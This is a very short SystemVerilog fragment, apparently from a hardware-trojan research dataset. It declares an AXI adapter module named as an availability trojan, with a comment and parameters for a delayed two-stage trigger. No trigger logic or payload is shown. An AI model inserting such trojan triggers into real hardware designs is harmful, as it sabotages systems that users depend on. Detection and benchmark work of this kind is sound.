...
module axi_adapter_trojan_Availability #(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=6331, act=3165)
    // ============================================================
    localparam int ARM_THRESHOLD   = 6331;
    localparam int ACTIVATE_DELAY  = 3165;
